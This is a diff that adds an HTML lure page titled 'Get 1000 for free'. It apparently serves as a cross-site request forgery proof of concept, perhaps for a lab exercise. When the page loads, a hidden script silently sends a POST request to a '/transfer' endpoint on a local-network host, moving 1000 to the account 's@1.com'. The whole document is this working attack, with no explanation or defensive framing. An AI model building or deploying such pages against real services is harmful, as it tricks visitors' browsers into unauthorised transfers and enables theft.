@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Get 1000 for free</title>
+  </head>
+  <body>
+    <h1>Get 1000 for free</h1>
+    <p>I could give you an idea.</p>
+    
+    <script>
+      window.addEventListener('load', function() {
+        const payload = {
+          "user_to": "s@1.com",
+          "amount": "1000"
+        };
+        
+        fetch("http://192.168.2.98:55824/transfer", {
+          method: "POST",
+          body: JSON.stringify(payload),
+          headers: {
+            "Content-Type": "application/json"
+          }
+        }).then(response => {
+          console.log("Request sent successfully!");
+        }).catch(error => {
+          console.error("Error sending request:", error);
+        });
+      });
+    </script>
+  </body>
+</html>
+
